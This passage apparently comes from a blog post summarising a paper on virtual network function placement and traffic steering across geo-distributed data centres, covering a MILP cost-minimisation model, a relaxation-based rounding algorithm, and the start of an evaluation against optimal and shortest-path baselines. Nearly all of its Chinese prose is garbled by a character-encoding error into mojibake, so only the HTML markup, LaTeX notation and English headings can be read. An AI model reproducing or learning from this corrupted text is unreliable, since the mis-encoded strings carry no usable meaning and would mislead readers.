”ç©¶éƒ½åƒ…åƒ…é—œæ³¨æ–¼éƒ¨å±¬æˆæœ¬ï¼Œæ—¨åœ¨æ¸›å°‘è³‡æ–™ä¸­å¿ƒçš„è³‡æºæ¶ˆè€—ï¼Œåƒæ˜¯CPUã€è¨˜æ†¶é«”ã€å„²å­˜ç©ºé–“ç­‰ï¼Œæˆ–æ˜¯å–®ç¨è‘—é‡æ–¼é€šè¨Šæˆæœ¬ï¼Œåƒæ˜¯æœ€å¤§é™åº¦æ¸›å°‘é»å°é»çš„å»¶é²ç­‰<br>ä½†å¹¾ä¹æ²’æœ‰è€ƒé‡åˆ°è‹¥ä½œç‚ºVNFéƒ¨å±¬çš„é€šè¨Šæˆæœ¬ã€‚</p><p>åœ¨æœå‹™éˆä¸Šæ¯å€‹éˆçµä¸Šçš„ç¶²è·¯åŠŸèƒ½éƒ½æ˜¯æœ‰åºçš„ï¼Œæ¯å€‹éˆçµä¹Ÿéƒ½æœ‰è‡ªå·±çš„æµé€Ÿï¼ŒåŒæ™‚åœ¨ä¸åŒVNFéƒ¨å±¬åœ¨åœ°åŸŸåˆ†å¸ƒçš„è³‡æ–™ä¸­å¿ƒçš„ä¸åŒVNFï¼Œå°‡å°è‡´ä¸åŒçš„é€šè¨Šæˆæœ¬ã€‚é€™ä»£è¡¨éƒ¨å±¬æˆæœ¬èˆ‡é€šè¨Šæˆæœ¬ä¹‹é–“çš„é—œä¿‚ä¸ç–¼å¤ è¢«å¿½è¦–ï¼Œæ­¤å¤–èˆŠæœ‰ç ”ç©¶ä¹Ÿå¾ˆå°‘è€ƒæ…®NFVæœå‹™ä¸­çš„æµé‡å¹³è¡¡å•é¡Œï¼Œä»¥å‰çš„ç ”ç©¶é€šå¸¸æœƒå‡è¨­VNFæµä¸èƒ½å¤ è¢«åˆ†é…åˆ°åŒä¸€é¡çš„å¤šå€‹VNF Instanceä¸Šï¼Œæˆ–æ˜¯å…¶åˆ†æ•£å¼æµé‡ç‡(distributed flow rate)æ˜¯é å…ˆå®šç¾©å¥½çš„ï¼Œé€™å°æ–¼å¤§è¦æ¨¡ç¶²è·¯ä¸­çš„ç§æœ‰NFVæœå‹™ä¾†èªªæ˜¯ä¸é™å¯¦ä¹Ÿæ²’æ•ˆç‡çš„ï¼Œæœ¬ç¯‡è«–æ–‡èªç‚ºVNF instanceçš„æ•¸é‡å’Œç›¸æ‡‰çš„ç¶²è·¯æµé‡æ‡‰è©²æ ¹æ“šç•¶å‰ç¶²è·¯ç‹€æ…‹é€²è¡Œèª¿æ•´ã€‚</p><p>æœ¬ç¯‡è«–æ–‡ï¼Œè€ƒé‡åˆ°æœ‰åºæœå‹™éˆåœ¨ä¸åŒåœ°ç†åˆ†å¸ƒè³‡æ–™ä¸­å¿ƒä¸‹çš„éƒ¨å±¬æˆæœ¬ä»¥åŠé€šè¨Šæˆæœ¬é–“çš„æ¬Šè¡¡å•é¡Œï¼Œä¸¦ä¸”æˆ‘å€‘å…è¨±ä¸€ç¨® NF å…·æœ‰å¤šå€‹ VNF å¯¦ä¾‹ã€‚</p><p>æœ¬æ–‡ä¸»è¦è²¢ç»ï¼š</p><ul><li>æœ¬æ–‡å°‡ç¶œåˆè€ƒé‡ç¶²çµ¡æ‹“æ’²ã€VNFçš„æ•¸é‡å’Œéƒ¨ç½²ä»¥åŠæµé‡èª¿åº¦ï¼Œä¾†å°‡VNFéƒ¨å±¬ä»¥åŠæµé‡èª¿åº¦å•é¡Œè½‰æ›ç‚ºæ··å’Œæ•´æ•¸ç·šæ€§è¦åŠƒå•é¡Œ(mixed integer linear programming, MILP)ï¼Œï¼Œä»¥é™ä½éƒ¨ç½²æˆæœ¬å’Œé€šè¨Šæˆæœ¬ã€‚</li><li>åœ¨è©²MILPæ–¹ç¨‹å¼çš„åŸºç¤ä¸Šè¨­è¨ˆä¸€ç¨®ä½è¤‡é›œåº¦çš„ åŸºæ–¼é¬†å¼›çš„æ¼”ç®—æ³•ï¼Œä¸¦é€²è¡Œå¤§é‡å¯¦é©—ä¾†èªªæ˜æ­¤æ¼”ç®—æ³•ç›¸è¼ƒç¾æœ‰æ¼”ç®—æ³•çš„å„ªå‹¢ï¼Œçµæœè¡¨æ˜æœ¬ç ”ç©¶æå‡ºçš„æ¼”ç®—æ³•å¯æœ‰æ•ˆé™ä½éƒ¨å±¬æˆæœ¬ä»¥åŠé€šè¨Šæˆæœ¬ã€‚</li></ul><h2 id="Ch2-System-Model"><a href="#Ch2-System-Model" class="headerlink" title="Ch2-System Model"></a>Ch2-System Model</h2><h3 id="A-DCs-Topology"><a href="#A-DCs-Topology" class="headerlink" title="A. DCs Topology"></a>A. DCs Topology</h3><p>ç”±æ–¼è³‡æ–™ä¸­å¿ƒåˆ†å¸ƒåœ¨ä¸–ç•Œå„åœ°ï¼Œä¸åŒè³‡æ–™ä¸­å¿ƒé–“æ‰€å‚³è¼¸çš„ç¶²è·¯æµé‡æœƒæœ‰è‘—ä¸åŒçš„æˆæœ¬(cost)<br>é€™è£¡é€éç„¡å‘åœ–(indirected graph) ä¾†ä»£è¡¨è³‡æ–™ä¸­å¿ƒçš„ç¶²è·¯æ‹“åœ– $G_{d}&#x3D;(D,E_{d})$<br>$D$ ç‚ºè³‡æ–™ä¸­å¿ƒ  $E_{d}$ ä»£è¡¨ç¶²è·¯é‚Šç·£<br>$H_{dp}$ ç‚º edge $e_{dp} \in E_{d}$çš„ æ¬Šé‡(weight) å…¶ä¸­ $d,p \in D$<br>(ä¸Šé¢å°±ä»£è¡¨ï¼ŒDå’ŒPæ˜¯è³‡æ–™ä¸­å¿ƒï¼Œè€ŒHæ˜¯DPé€™ä¹‹é–“ç¶²è·¯é€£æ¥çš„Weightï¼Œæ‰€ä»£è¡¨çš„æ˜¯é€™å…©è³‡æ–™ä¸­å¿ƒä¹‹é–“çš„å‚³è¼¸æˆæœ¬)<br>è€Œé€™è£¡é ˆæ³¨æ„ï¼Œå€‹åˆ¥è³‡æ–™ä¸­å¿ƒè‡ªå·±åˆ°è‡ªå·±ä¹‹é–“æ²’æœ‰å‚³è¼¸æˆæœ¬ $H_{dd}&#x3D;0$</p><h3 id="B-Chain-Set"><a href="#B-Chain-Set" class="headerlink" title="B. Chain Set"></a>B. Chain Set</h3><p>æœ‰ä¸€çµ„éˆ $C&#x3D;{c1,c2,â€¦}$ è¢«éƒ¨å±¬åˆ°è³‡æ–™ä¸­å¿ƒï¼Œè‹¥å°‡æœå‹™éˆä¸­$c_{i} \in C$ä¾†æºç¯€é»(source)èˆ‡ç›®çš„ç¯€é»(destination)åˆ†åˆ¥ä»¥ $o_{i}$ ä»¥åŠ $t_{i}$ è¡¨ç¤ºã€‚<br>æ¯å€‹æœå‹™éˆ $c_{i}$ä¸­éƒ½æœ‰ä¸€çµ„ä»¥æ’åºä¹‹ç¶²è·¯åŠŸèƒ½ $c_{i}&#x3D;{s_{i,1},s_{i,2},â€¦.s_{i,j},â€¦}$ ä¾†ä»¥é€Ÿç‡ $R_{i}$è™•ç†ç¶²è·¯æµé‡<br>æˆ‘å€‘å®šç¾© $|c_{i}|$ ç‚ºæœå‹™éˆ $c_{i}$çš„é•·åº¦ï¼Œä¸¦ä¸”å®šç¾© $n(s_{i,j})$ ä¾†è¡¨ç¤ºğ‘ ğ‘–,ğ‘—çš„ç¶²çµ¡åŠŸèƒ½çš„é¡å‹<br>èˆ‰ä¾‹ä¾†èªªå¦‚åœ–<br><img src="https://i.imgur.com/y39ct1S.png"><br>åœ–ä¸­ä¸‰å€‹æœå‹™éˆçš„é•·åº¦åˆ†åˆ¥ç‚º2,3,3 (æ³¨æ„:ï¼Œä¸åŒçš„æœå‹™éˆå¯èƒ½éœ€è¦ä¸€ç¨®ç¶²çµ¡åŠŸèƒ½)<br>èˆ‰ä¾‹ä¾†èªªï¼Œ$c1$ $c2$ $c3$ å¯èƒ½éƒ½å…±åŒåŒ…å«ç¶²è·¯åŠŸèƒ½ $f1$ï¼Œå³ $n(s_{1,1})&#x3D;n(s_{2,2})&#x3D;n(s_{3,2})&#x3D;f_{1}$</p><h3 id="C-NFs-Graph"><a href="#C-NFs-Graph" class="headerlink" title="C. NFs Graph"></a>C. NFs Graph</h3><p>åŸºæ–¼ä¸Šè¿°çš„éˆé›†åˆ(Chain Set)ï¼Œæˆ‘å€‘å¯ä»¥å»ºæ§‹ç¶²è·¯åŠŸèƒ½åœ– $G_{n}$<br>æ­¤ç¶²è·¯åŠŸèƒ½åœ–ç‚ºæœ‰å‘éå¾ªç’°åœ–(directed acyclic graph, DAG)<br>$G_{n}&#x3D;(V_{n},E_{n})$ï¼Œä¸”$V_{n}$ å¯è¢«æ­¸ç´ç‚ºä¸‰å€‹ç¨®é¡:</p><ul><li>sources $O$</li><li>network function $N$</li><li>destinations $T$<br>è€Œæ¯å€‹edge $e_{m,n} \in E_{n}$ ä»£è¡¨ç¶²è·¯åŠŸèƒ½$m$èˆ‡$n$ä¹‹é–“çš„ç¶²è·¯æµé‡<br>å°æ–¼éˆ $c_{i}$ ä¸­çš„æ¯å€‹æœå‹™å°(service pair) $(s_{i,j},s_{i,j+1})$ï¼Œåœ¨$G_{n}$ä¸­å­˜åœ¨ä¸€å€‹ç¶²è·¯åŠŸèƒ½å°(network function pair)<br>$(m,n)$ï¼Œå­˜åœ¨å¾$m$åˆ°$n$çš„æœ‰å‘éˆçµï¼Œå…¶ä¸­ $n(s_{i,j})&#x3D;m$ , $n(s_{i,j+1})&#x3D;n$</li></ul><p>å¦‚åŒå‰›å‰›æåŠï¼Œä¸åŒç¶²è·¯åŠŸèƒ½å¯èƒ½æœƒç”±ä¸åŒæœå‹™éˆä»¥ä¸åŒçš„ç¶²é‡é€Ÿç‡ä¾†å…±äº«åŠŸèƒ½<br>å°æ–¼æ¯å€‹edge $e_{m,n} \in E_{n}$ï¼Œæˆ‘å€‘å®šç¾©ä¸€å€‹é›†åˆ $U_{m,n} &#x3D; { i : c_{i} \in C, n(s_{i,j})&#x3D;m,n(s_{i,j+1})&#x3D;n}$ ä¾†è¨˜éŒ„å…·æœ‰ç¶²è·¯åŠŸèƒ½å°($m$,$n$)çš„æœå‹™éˆ</p><p>å­˜åœ¨å…·æœ‰ä¸åŒæµé‡è¦æ±‚çš„ä¸åŒç¶²è·¯æµé‡åœ¨edge $e_{m,n}$ ä¸Šå‚³è¼¸ï¼Œè¡¨ç¤ºç‚º $R_{i}$, $\forall i \in U_{m,n}$<br>èˆ‰ä¾‹ä¾†èªªï¼Œä¾†è‡ªæœå‹™éˆ $c1$ å’Œ $c2$ çš„ç¶²è·¯æµé‡åœ¨ edge $e_{f_{1},f_{2}}$ä¸Šå‚³è¼¸ï¼Œå¦‚ä¸‹åœ–æ‰€ç¤º<br><img src="https://i.imgur.com/Ba0onF6.png"><br>é€Ÿç‡åˆ†åˆ¥æ˜¯ 2èˆ‡1</p><h3 id="D-VNFs-Graph"><a href="#D-VNFs-Graph" class="headerlink" title="D. VNFs Graph"></a>D. VNFs Graph</h3><p>æˆ‘å€‘çš„ç›®æ¨™æ˜¯è¦ä»¥VNF instanceå½¢å¼ä¾†åœ¨åœ– $G_{n}$ ä¹‹ä¸­éƒ¨å±¬æ‰€æœ‰ç¶²è·¯åŠŸèƒ½<br>$G_{n}$ä¸­æ¯å€‹ç¶²è·¯åŠŸèƒ½nå¯èƒ½æœƒæœ‰å¤šå€‹VNF Instances åœ¨ä¸åŒè³‡æ–™ä¸­å¿ƒ<br>èˆ‰ä¾‹ä¾†èªªå¦‚ä¸‹åœ–<br><img src="https://i.imgur.com/nZQBKNl.png"><br>ç¶²è·¯åŠŸèƒ½ $f1$å¯èƒ½æœƒæœ‰å…©å€‹VNF Instanceåˆ†åˆ¥ä½æ–¼è³‡æ–™ä¸­å¿ƒ $d1$ä»¥åŠ $d2$</p><p>æ³¨æ„ï¼Œæ¯å€‹ç¶²çµ¡åŠŸèƒ½ $n$ åœ¨æ‰€æœ‰ $|D|$ æ•¸æ“šä¸­å¿ƒä¸­å¯èƒ½æœ€å¤šæœ‰ $|D|$ å¯èƒ½çš„Instanceï¼Œ<br>ä¸¦ä¸” $G_{n}$ ä¸­çš„æ¯ä¸€å° $(m,n)$ ä¹Ÿå¯èƒ½ç›¸æ‡‰åœ°åœ¨å®ƒå€‘ä¹‹é–“æœ€å¤šæœ‰ $|D|^{2}$ å€‹éˆæ¥ã€‚</p><p>å› æ­¤ï¼Œåœ¨VNFåœ– $G_{v}&#x3D;(V_{v},E_{v})$ï¼Œç¯€é»é›†åˆ $V_{v}$ åŒ…æ‹¬ $|V_{n}| \cdot |D|$ instances è¡¨ç¤ºç‚ºé›†åˆ $V$ã€sourcesé›†åˆ $O$ä»¥åŠç›®æ¨™ç¯€é»é›†åˆ $T$ï¼Œè€Œ $E_{v}$ è¡¨ç¤ºä»–å€‘ä¹‹é–“çš„éˆçµã€‚<br>å°æ–¼æ¯å€‹edge $e_{u,v} \in E_{v}$ï¼Œè®“ $f^{i}<em>{uv}$ è¨»è¨˜ç‚ºæœå‹™éˆ $C</em>{i}$ä¸­ instance $u$,$v$ é–“çš„æµé‡é€Ÿç‡ã€‚</p><p>èˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘å€‘è€ƒæ…®åœ– $G_{n}$ ä¸­çš„å…©å€‹ç¶²è·¯åŠŸèƒ½ $(f1,f2)$ ä»¥åŠedge $e_{f_{1},f_{2}}$ï¼Œå°æ‡‰çš„ $G_{v}$ åœ¨ä¸‹åœ–ä¸­é¡¯ç¤ºï¼Œæœ‰ 2 å€‹è³‡æ–™ä¸­å¿ƒ</p><p><img src="https://i.imgur.com/YhG7xQY.png"></p><p>$f1,f2$çš„Instanceåˆ†åˆ¥æ˜¯ $v1$ $v2$ ä»¥åŠ $v3$ $v4$ï¼Œä¸¦ä¸”jæˆ‘å€‘å¯ä»¥è§€å¯Ÿåˆ°ï¼Œç¶²è·¯åŠŸèƒ½ $f1$ $f2$å…±æœ‰4å€‹edgeï¼Œè€Œğ‘“1å’Œğ‘“2ä¹‹é–“çš„ç¶²çµ¡æµé‡å¯ä»¥åœ¨é€™å››å€‹edgeä¹‹é–“è‡ªç”±åˆ†ä½ˆ</p><p>æ–¼ä»»ä½•å¯¦ä¾‹$v \in V$ï¼Œæˆ‘å€‘ä½¿ç”¨$d(v)$ å’Œ$n(v)$åˆ†åˆ¥è¡¨ç¤ºå…¶è³‡æ–™ä¸­å¿ƒä½ç½®å’Œç¶²çµ¡åŠŸèƒ½é¡å‹ã€‚ä¾‹å¦‚ï¼Œ$d(v_{1})&#x3D;d1$ï¼Œ$n(v_{1})&#x3D;f1$</p><p>Let $N(n)$ ä»£è¡¨æä¾›ç¶²è·¯åŠŸèƒ½ $n$çš„VNFé›†åˆï¼Œä¾‹å¦‚åœ¨ä¸Šåœ–ä¸­ï¼Œæˆ‘å€‘æœ‰ $v1$ä»¥åŠ $v2$ ä¾†æä¾›ç¶²è·¯åŠŸèƒ½ $f1$ï¼Œå³ $N(f1)&#x3D;{ v1,v2 }$ï¼Œå°æ–¼æ¯å€‹ VNF Instance Pair $(u,v)$ï¼Œå¯ä»¥é€é $f_{uv}^{i}$ ä¾†è¡¨ç¤ºæµç¶“é‚Šç·£çš„ç¶²è·¯æµé‡é€Ÿç‡ã€‚<br>å…¶ä¸­å°æ–¼éˆ $c_{i}$ ä¸Šçš„é‚Šç·£æ»¿è¶³ $e_{u,v}\in E_{v}$<br>ä¸”åœ¨åœ– $G_{v}$ä¸­ï¼Œ$\forall i\in U_{n(u),n(v)}$</p><p><img src="https://i.imgur.com/heLrZ8U.png"></p><h2 id="Ch3-Problem-Formulation"><a href="#Ch3-Problem-Formulation" class="headerlink" title="Ch3-Problem Formulation"></a>Ch3-Problem Formulation</h2><p>åŸºæ–¼ä¸Šä¸€ç« çš„ç³»çµ±æ¨¡å‹ï¼Œæˆ‘å€‘å¯ä»¥å…¬å¼åŒ–VNFéƒ¨å±¬ä»¥åŠæµé‡èª¿åº¦å•é¡Œï¼Œè½‰æ›æˆæ··åˆæ•´æ•¸ç·šæ€§è¦åŠƒå•é¡Œ<br>(MILP)ï¼Œä¸”ç›®æ¨™æ˜¯è¦æœ€å°åŒ–æ‰€æœ‰VNF Pairsä¹‹é–“çš„éƒ¨å±¬ä»¥åŠé€šè¨Šç¸½æˆæœ¬</p><h3 id="VNF-Instance-Placement"><a href="#VNF-Instance-Placement" class="headerlink" title="VNF Instance Placement"></a>VNF Instance Placement</h3><p>å¦‚åœ–$G_{v}$æ‰€ç¤ºï¼Œæ¯å€‹ç¶²çµ¡åŠŸèƒ½å¯ä»¥ç”±æ‰€æœ‰è³‡æ–™ä¸­å¿ƒè¨—ç®¡ï¼Œæ¯å€‹è³‡æ–™ä¸­å¿ƒå¯ä»¥è¨—ç®¡æ‰€æœ‰é¡å‹çš„ç¶²çµ¡åŠŸèƒ½ï¼Œå› æ­¤æˆ‘å€‘å®šç¾©äº†äºŒé€²ä½çš„è®Šæ•¸ $x_{v}$ ä¾†è¡¨ç¤º <strong>åœ¨è³‡æ–™ä¸­å¿ƒ $d(v) ä¸­è² è²¬æä¾›çš„ç¶²è·¯åŠŸèƒ½ $n(v)$ çš„VNF Instance æ˜¯å¦è¢«å¯¦éš›éƒ¨å±¬</strong></p><p><img src="https://i.imgur.com/LW9uzOu.png"></p><h3 id="Flow-requirement-constraints"><a href="#Flow-requirement-constraints" class="headerlink" title="Flow requirement constraints"></a>Flow requirement constraints</h3><p>å°æ–¼æ¯å€‹æœå‹™éˆ $c_{i}$ æ‰€éœ€è¦çš„æµé‡ï¼Œå¯è¢«åˆ†é…åˆ°æ‰€æœ‰å®ƒçš„VNF Instanceä¸Š<br>ä¾‹å¦‚ï¼Œéˆ $c_{i}$ä¸­çš„ç¶²çµ¡åŠŸèƒ½pair $m$ã€$n$ ä¹‹é–“çš„ç¶²çµ¡æµç‡ $R_{i}$ å°‡åˆ†ä½ˆåˆ°$G_{v}$ä¸­Instance $v$ã€$u$ ä¹‹é–“çš„æ‰€æœ‰é‚Šä¸Šï¼Œå…¶ä¸­$n(u)&#x3D;m$ï¼Œ$n(v)&#x3D;n$</p><p><img src="https://i.imgur.com/IdjsfTH.png"></p><p>å°æ–¼ä¾†æºç¯€é»èˆ‡ç›®æ¨™ç¯€é»ï¼Œå¯ä»¥åˆ—å‡ºä»¥ä¸‹ç­‰å¼<br><img src="https://i.imgur.com/iattDHR.png"></p><h3 id="VNF-flow-constraint"><a href="#VNF-flow-constraint" class="headerlink" title="VNF flow constraint"></a>VNF flow constraint</h3><p>å°æ–¼æ¯å€‹VNF Instanceï¼Œè¼¸å…¥æµé‡æ˜¯æºè‡ªè¼¸å…¥instance $i(v)$ä¾†è™•ç†<br>ç„¶å¾Œåˆ†æ•£åˆ°è¼¸å‡ºinstance $o(v)$</p><p><img src="https://i.imgur.com/4EfnGB6.png"></p><p>å…¶ä¸­ $\alpha_{n(v)}$ æ˜¯ç”±ç¶²è·¯åŠŸèƒ½ä¾†æ±ºå®šçš„æ“´å±•å› å­(scaling factor)</p><h3 id="The-relationship-between-x-v-and-f-i-uv"><a href="#The-relationship-between-x-v-and-f-i-uv" class="headerlink" title="The relationship between $x_{v}$ and $f^{i}_{uv}$"></a>The relationship between $x_{v}$ and $f^{i}_{uv}$</h3><p>åªè¦æœ‰æµé‡é€šé VNF å¯¦ä¾‹ $v$ï¼ŒäºŒé€²ä½è®Šæ•¸æ‡‰è¨­å®šç‚º 1 ä»¥æä¾›ç¶²çµ¡åŠŸèƒ½$n(v)$ï¼Œä¸¦ä¸”æ­¤ VNF å¯¦ä¾‹æ‡‰éƒ¨ç½²åœ¨$d(v)$ ä¸­ã€‚é€™å¯ä»¥æè¿°ç‚º</p><p><img src="https://i.imgur.com/kNT4fbV.png"></p><p><code>A Joint MILP Formulation</code></p><p>è‹¥æŠŠä¸Šè¿°ç¸½çµï¼Œå¯ä»¥å¾—åˆ°ä»¥ä¸‹çš„ <strong>Cost-min</strong> å•é¡Œ</p><h3 id="Cost-Min"><a href="#Cost-Min" class="headerlink" title="Cost-Min"></a>Cost-Min</h3><p><img src="https://i.imgur.com/g756xNt.png"></p><p>ä¿‚æ•¸ $\gamma$ å’Œ $\delta$ ç”±ç”¨æˆ¶å®šç¾©ï¼Œä»¥å¹³è¡¡éƒ¨ç½²æˆæœ¬å’Œé€šè¨Šæˆæœ¬ï¼Œä¸¦å¯æ ¹æ“šä¸åŒçš„ QoS è¦æ±‚é€²è¡Œèª¿æ•´ã€‚</p><h2 id="Ch4-Relaxation-Based-Algorithm"><a href="#Ch4-Relaxation-Based-Algorithm" class="headerlink" title="Ch4-Relaxation-Based Algorithm"></a>Ch4-Relaxation-Based Algorithm</h2><p><img src="https://i.imgur.com/X5V2paB.png"><br>å› ç‚ºæœ‰ æ•´æ•¸è®Šæ•¸ $x_{v}$ ï¼Œè¨ˆç®—ä¸Šä¾†è§£æ±º Cost-Minå•é¡Œæ˜¯è¢«ç¦æ­¢çš„ï¼Œç‰¹åˆ¥è¦æ¨¡å¤§çš„ç¶²è·¯ä¸­ã€‚<br>æ­¤ç« ç¯€ä¸­ï¼Œæˆ‘å€‘æœƒæå‡ºåŸºæ–¼é¬†æ•£çš„æ–¹å¼ï¼Œä¾†è§£æ±ºCost-minå•é¡Œã€‚</p><p>é¦–å…ˆæˆ‘å€‘å°‡ $x_{v}$ é¬†å¼›ç‚º[0,1]ç¯„åœå…§çš„å¯¦æ•¸ï¼Œä»¥é™ä½è¨ˆç®—è¤‡é›œåº¦ã€‚ç¶“éé¬†å¼›å¾Œï¼Œæˆ‘å€‘çš„æ¨¡å‹è¢«ç°¡åŒ–ç‚ºç·šæ€§è¦åŠƒ(LP)å•é¡Œï¼Œå¦‚æ¼”ç®—æ³•ä¸­ç¬¬1è¡Œï¼Œé€™å¯ä»¥é€éMatlabè¼•é¬†è§£æ±ºã€‚</p><p><img src="https://i.imgur.com/cW2iRuY.png"></p><p>æˆ‘å€‘å° $x_{v}$ åšéå¢æ’åºï¼Œå¦‚æ¼”ç®—æ³•è¡¨ä¸­ç¬¬2è¡Œï¼Œ</p><p>ä¸¦å°‡æ¯å€‹éé›¶ $x_{v}$ çš„å€¼è¨­ç‚º1ï¼Œå¦‚æ¼”ç®—æ³•è¡¨ä¸­ç¬¬5è¡Œï¼Œ</p><p>åœ¨é€™ç¨®æƒ…æ³ä¸‹ï¼Œæˆ‘å€‘ä»¥æ•´æ•¸ $x_{v}^{*}$ å½¢å¼ç²å¾—ä¸€å€‹æ–°çš„ VNF éƒ¨ç½²è§£æ±ºæ–¹æ¡ˆï¼Œ</p><p>ä¸¦å°‡æ¯å€‹ç¶²çµ¡åŠŸèƒ½çš„ VNF Instance æ•¸é‡è¨˜éŒ„ç‚º $count_{n(v)}$ï¼Œå¦‚æ¼”ç®—æ³•è¡¨ä¸­ç¬¬6è¡Œï¼Œ<br>æˆ‘å€‘å°‡æ•´æ•¸solution  $ x_{v}^{*} $ ä½œç‚ºè¼¸å…¥ä¸¦è¨ˆç®—æµé‡èª¿åº¦çš„è§£ç­” $ f_{uv}^{*j} $ ï¼Œä¸”ç¸½æˆæœ¬ $costâ€™$</p><p>æˆ‘å€‘å°‡æ•´æ•¸è§£ $x_{v}^{*}$ ä½œç‚ºè¼¸å…¥ï¼Œé€šéåœ¨ç¬¬ 11 è¡Œå†æ¬¡æ±‚è§£ Cost-Min-LP å•é¡Œä¾†è¨ˆç®—æµé‡èª¿åº¦è§£ $f_{uv}^{*j}$ å’Œç¸½æˆæœ¬ $costâ€™$</p><p>è«‹æ³¨æ„ï¼Œæ”¾å¯¬å¯èƒ½æœƒå°è‡´æ›´å¤š VNF å¯¦ä¾‹ï¼Œå› æ­¤æˆ‘å€‘ä¸‹ä¸€æ­¥å°‡å˜—è©¦é€²ä¸€æ­¥æ¸›å°‘å¯¦ä¾‹æ•¸é‡ä»¥åŠéƒ¨ç½²æˆæœ¬ï¼ŒåŒæ™‚ç¢ºä¿å¾ç¬¬ 12 è¡Œåˆ°ç¬¬ 22 è¡Œé–“çš„é€šè¨Šæˆæœ¬æ¥è¿‘æœ€ä½³åŒ–ã€‚<br>æˆ‘å€‘å¾éé›¶ $x_{v}$ çš„æœ€å°å€¼å…§çš„å¯¦ä¾‹ $v$ é–‹å§‹ã€‚<br>è«‹æ³¨æ„ï¼Œå¦‚æœ$v$æ˜¯ç¶²çµ¡ä¸­å”¯ä¸€æä¾›ç¶²çµ¡åŠŸèƒ½$n(v)$çš„VNFå¯¦ä¾‹ï¼Œå³$count_{n(v)}$ &#x3D;&#x3D; 1ï¼Œå‰‡å¿…é ˆéƒ¨ç½²$v$ï¼Œä¸¦ä¸”è·³åˆ°ä¸‹ä¸€å€‹Instance<br>å¦å‰‡ï¼Œè‹¥ç¶²è·¯ä¸­å­˜åœ¨æä¾›ç›¸åŒç¶²è·¯åŠŸèƒ½ $n(v)$çš„VNF Instance(è¦‹14è¡Œ)ï¼Œå‰‡æˆ‘å€‘$x_{v}^{*}$ è¨­ç‚º0ï¼Œä¸¦é‡æ–°è¨ˆç®—æµé‡èª¿åº¦è§£ $f_{uv}^{*i}$ å’Œæ–°çš„ç¸½æˆæœ¬ $costâ€™$</p><p>åªæœ‰ç•¶æ–°æˆæœ¬ä½æ–¼ç•¶å‰çš„ $minCost$æ™‚ï¼Œæ‰æœƒæ›´æ–°NFVéƒ¨å±¬è§£ $x_{v}^{*}$ã€æµé‡èª¿åº¦è§£ $f_{uv}^{*j}$ ä»¥åŠç¸½æˆæœ¬ $minCost$ï¼Œç„¶å¾Œæ›´æ–°ç¶²è·¯åŠŸèƒ½ $n(v)$çš„Instanceæ•¸é‡ (è¦‹18ã€19è¡Œ)</p><p>å¦ä¸€æ–¹é¢ï¼Œå¦‚æœç¸½æˆæœ¬æ²’æœ‰é™ä½ï¼Œæˆ‘å€‘å°‡ $x_{v}^{*}$ çš„å€¼è¨­ç½®å› 1 ä¸¦ç§»å‹•åˆ°ä¸‹ä¸€å€‹å¯¦ä¾‹ï¼Œç›´åˆ°æˆ‘å€‘éæ­· $V$ ä¸­çš„æ‰€æœ‰ VNF å¯¦ä¾‹ï¼ˆç¬¬ 25 è¡Œï¼‰</p><p>æœ€çµ‚æˆ‘å€‘æœƒè¿”å› NFVéƒ¨å±¬è§£ $x_{v}^{*}$ã€æµé‡èª¿åº¦è§£ $f_{uv}^{*j}$ ä»¥åŠç¸½æˆæœ¬ $minCost$ ä½œç‚ºæ¼”ç®—æ³•çš„è¼¸å‡ºã€‚</p><h2 id="Ch5-Performance-Evaluation"><a href="#Ch5-Performance-Evaluation" class="headerlink" title="Ch5-Performance Evaluation"></a>Ch5-Performance Evaluation</h2><p>åœ¨æœ¬ç¯€ä¸­ï¼Œæˆ‘å€‘é€šéå°‡åŸºæ–¼é¬†å¼›çš„ç®—æ³• (â€œRLXâ€) èˆ‡ Cost-Min çš„æœ€ä½³çµæœ (â€œOPTâ€) å’Œæœ€çŸ­è·¯å¾‘ç®—æ³• (â€œSPâ€) é€²è¡Œæ¯”è¼ƒä¾†è©•ä¼°å®ƒ<br>å¯¦é©—è¨­ç½®ï¼š</p><ul><li>ç¶²çµ¡ä¸­æœ‰âˆ£ğ·âˆ£ &#x3D; 20 å€‹è³‡æ–™ä¸­å¿ƒã€‚ $H_{dp}$ éš¨æ©Ÿè¨­ç½®åœ¨ [1,20] çš„ç¯„åœå…§ï¼Œè¡¨ç¤ºDCä¹‹é–“çš„è·³èºæ•¸</li><li>å…±æœ‰ 20 æ¢æœå‹™éˆï¼Œå¤šæ¢éˆå…±äº« 15 ç¨®ä¸åŒé¡å‹çš„ç¶²çµ¡åŠŸèƒ½</li><li>æœå‹™éˆçš„æµé‡è¨­ç½®åœ¨ [1, 10] çš„ç¯„åœå…§</li><li>ä¿‚æ•¸ $\gamma$ è¨­ç½®ç‚º 10ï¼Œ$\delta$ è¨­ç½®ç‚º 1</li><li>æˆ‘å€‘ä½¿ç”¨å•†æ¥­æ±‚è§£å™¨ Gurobi ä¾†è§£æ±ºæˆ‘å€‘çš„ Cost-Min å’Œ Cost-Min-LP å•é¡Œ<br>æœ¬ç ”ç©¶é€šéåœ¨ä¸åŒå ´æ™¯ä¸­æ”¹è®Šåƒæ•¸æä¾›äº†å»£æ³›çš„å¯¦é©—</li></ul><h3 id="The-value-of-ğ›¾"><a href="#The-value-of-ğ›¾" class="headerlink" title="The value of ğ›¾"></a>The value of ğ›¾</h3><p><img src="https://i.imgur.com/Et8CiI7.png"><br>é¦–å…ˆï¼Œæˆ‘å€‘èª¿æŸ¥ğ›¾å’Œğ›¿çš„å½±éŸ¿ã€‚æˆ‘å€‘è¨­ç½® ğ›¿ &#x3D; 1ï¼Œä¸¦å°‡ ğ›¾ çš„å€¼å¾ 5 è®Šç‚º 50ã€‚çµæœå¦‚åœ– 4 æ‰€ç¤º<br>åœ– 4 ä¸­çš„çµæœè¡¨æ˜ï¼Œä¸‰ç¨®ç®—æ³•çš„æ‰€æœ‰æˆæœ¬éƒ½éš¨è‘— ğ›¾ çš„å¢åŠ è€Œå¢é•·ã€‚åŸå› æ˜¯ï¼Œğ›¾çš„å¢åŠ æœƒå°è‡´æ›´é«˜çš„ VNF éƒ¨ç½²æˆæœ¬ã€‚<br>å¾—æ³¨æ„çš„æ˜¯ï¼ŒSP çš„å¢é•·ç‡é å¤§æ–¼å…¶ä»–å…©ç¨®ç®—æ³•ï¼Œå› ç‚º SP ä¸»è¦é€šéæ¸›å°‘æ¯å€‹ç¶²çµ¡æµçš„è·¯å¾‘é•·åº¦ä¾†é—œæ³¨é€šä¿¡æˆæœ¬ï¼Œè€Œå¿½ç•¥äº†éƒ¨ç½²æˆæœ¬ã€‚<br>å› 